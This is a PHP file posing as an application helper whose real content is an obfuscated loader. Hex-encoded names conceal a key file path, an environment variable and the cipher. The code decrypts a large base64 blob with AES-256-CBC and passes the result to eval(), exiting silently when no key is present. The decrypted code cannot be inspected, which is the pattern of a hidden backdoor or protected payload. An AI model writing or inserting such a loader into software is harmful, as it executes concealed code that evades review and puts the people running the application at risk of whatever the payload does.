<?php
namespace App\Helpers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('MSwfAS9pCmwiNuDztzhhNA==');

$c=base64_decode(

'fjBqeNgYyoBCI7aPoAyY7EJgcpgimsZLwlA4srBWV7PFPJ3AFyVsjzMKQ0QCBx430+AFj1wHykXh' .
'2NYUlvJLdqJEpN5dZNEnudrQ/vIFu2IWz7A3XQPblZW2y+sMxqtq8Zvwkmb/JduK60//8bpJIcmh' .
'B1KtkmSbDL90PxoPBz5dbcjsiKosYwPbhEyF2YGiVccZQoDA99qwton2aH+fpQZAEIkFJoiPPzA8' .
'm+bholiVXh4RGabUrN27Vc0lvxEUUXTyFnIekrRkWrbgQdT/pn9CDuys1R1XYmKSB2AqQ4Cc8F7V' .
'uI6CDOkz0Byrf3v+jpw7MJMRNRv6W0NgU40lSjU6euhVo8xYW/GkYS+D+Bsui/dj3zR2W8MiOACY' .
'rUt3TVcZorQH6LTe2tQF0UOwUYTCGTaP58Aj2AygCRs/FROmjUclDudhDRuVaX9RX2bVeCfS+Ao6' .
'AyQrxupHTXAGpDbn6pW3jdR7D53NReWD57EyXFL+H3vSI/2rPQlMWrB2i9bB+esrWN/GeiPQJWcH' .
'vuJKdTwpByUMdv0TBTaegmm3guJO+MbpTTuaxRGMvDMwocX5ghiUtC6ofVg6bd3V1LfgGyqhczQX' .
'volxROyxBUKaT8ff89em4Hth8ewaEOUcxPwgphtqXikeKhg2CV8hXafjUROjvsQ/qbBfxEz1dbZb' .
'rYnZfcVKHbiYWlUVpjvU5tRtRXn7hB6X1hYwCjoJxoanN3+s20kqgWZOkZQYxAT6w9XcazA/JEpZ' .
'Gjj86xaVb+XX4eD6UG51/nMWK/+dFogDRg1FTUGs9Gh1Fy7G+4k8c4uek6EakCAPMXjP16GoN3F9' .
'GjMh7D2WOyqdpRRaFIgzo9Z1xP34VY8zv/y2FGd2+/oEo9fToHMmgOP27Lxp3zBdGdoSJ7BDVlOO' .
'nwo+bHi4xim8yxuq7S7iC0Im+Ss7/bpakm5e4HQsWBi3lTtC0+GT6h+NYclT0Vq6/umd5bwrgcY/' .
'PDSxDgzNkukSF4pmNz0DxBOl4ExUOb9wdO0uyNZepAfaG7UNr+yWgtmXf4FdktprEUKs9brVXKTs' .
'g493riOfjFkYbqZGZxCrXGiSUfpZYf/RQ/iA4f6VrhkCgrrfsUuW7bjTVHefFUtP3i0dXJvgyc4e' .
'EmDMKkN+qzD4SpDTTiJkFWKdG4IOCHJ/J80sI8K2mgVSJGSBI72UWUG4jb+sapg6At0jrpTiMtku' .
'GlKikR06oJR8roW5l4JAE5Ta+X6xCKxbG5aRpv8iGge2MMuuMuknG5voHn4Ez8QZu8kOpkxeGouK' .
'Ft+NKC4n9Osg0hyhHXnJgp3bnbH1wMNZesKWEFnwN3c6BNqGqjY3jBKNatyfMKUuKAlUU7xdg48i' .
'N32ElyAIlJ1FOaZAgcQTaAP0xtg/uQqzZua4J7b18xRqSO+5je/skKDtJdv2CbzzgisIsmmc/nYB' .
'1FfrfP28Q0Oh/kbrdt6B4mpAUolujztlP/Amss6Gsh/5PJ3tTgFZJdvQBTWRHgsz53IS73nePgeW' .
'KuFEw1Gk+gaUEN6/rkmvhS0+z+Z244cPoUTsJX+8QPCDgBKgmcPbJ3hXkPJSKy5H+u5uiMspEstj' .
'yfOHiGd9nhu8OxeJWhI+3pVusyMAJaY9MlrP3QNipG/cotyPeG2EqltGLqbuErgYzblohaYW7Fzf' .
'LxFnxfCas1qW/wdW0QA8DGJXjGYO5UQFjr8gGiw9zPCVx/qdpql4tQLbbUKudpMVvKPelzVn6vEg' .
'20vGmxokN8bVQxbhfJJ9zxxXrx1DRu7use9hTGAf0UKBFUIy/Em+qry4GXs3UIdmU6O5GWzQKlMY' .
'rNiX29/5awI1cUDBq6I3NGGHmqD3GIuoFSCP65O6gFejdphLb4Z0e21dgOCQy6ZrH62e9+llVWNQ' .
'KMIK5avFcFhpIfQbzLbiPcdg3D4rMY9qz4JrGqZj/Gf65qHf+TUx8ZkaQKsHv2YHSKHGLHdPj+Un' .
'eyW7oHzq6SJ5TaApHWm+VLJ6TUUIpZV0WZ3ZNeBho6cQdl1D8eBtZYkYAEZgaTrRZh76LhyyuG/Y' .
'gaaD6BZs5GHZo4AvXCcswPj/gx4J06VEgnJmPOA/UW0GDBX2Ov1WnMPtmG3dMTjfET6hB7g27XGi' .
'9wOTLRDwTvh2VtnD6v3Ct/da92HqrOPJWCrIgolhgC/ereCvOM2hndERLtYKlWOLFas7Jii4j3n1' .
'zeutPu33BdWIuLU/dVEZk97/pdHSerCYxlV072YP2lvSixg14p/dunFoIiVBdmPTLD8yHnfyyAKJ' .
'a2msPbBa/clr9nzay9JbuLkG2zWV4verQt4veF6MuQkcGcjWCrkhI/EL5Y267PHlqjHnbk6unMkv' .
'vAOqjsqxcVVXhGfOb4rqlji6DtHeYAGWOIr/KtH4sI6JM5iTGHUhRosn5s29uOXuQOihJb8eWKlQ' .
'KQOpfool52zUzcGhEM7Nsv84VocBB+8wv3ekw7nhgVAJzmYcXjtDrx18Lk40gaZN6AihSk73wYX7' .
'smm4JtCIYIqZGC+0S9ql5ZymfRWnKxHCVGYJIdByOgI5PNpvIhAtI8GO5sIlEytlWlX3ddQ5WyHB' .
'XGtsgF0TqyyxVWIzx9HxL4YkhjNhA9onfmH5auBULvGAvvWa+V6nyCey/+5Ht+LPrRHvTlTeQxWv' .
'ic+jDywYVM9yiSfzVzOJN9tToboUhxfE5+Kk7scYJB3WXPymcSgofvzNpHc4Fm7bm9bA5zlpZgSr' .
'aq8/7n8lgEXSVH3ShFbU843tF782PkY6Ty2WAKhWmdrpb4zUY0rt1rMhPU0ULRwzuVsc7GdMHX8S' .
'4aooFBlprHFmdf22yRlzS0LmtF7hRdgR4nS6yOnFhv8sjM2HoQmDz6uru4SYjLHFH0Zc6M9JTGnm' .
'LQfX4JWIYb7+ercYIVBZQiadaTmMgWU5KwNB9EwvJGyPsTxhgkCpkkDywZgP36pEcR63X6W+Fn4X' .
'Kdn90eEp7RuEpZ9gIQyGYvQ='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

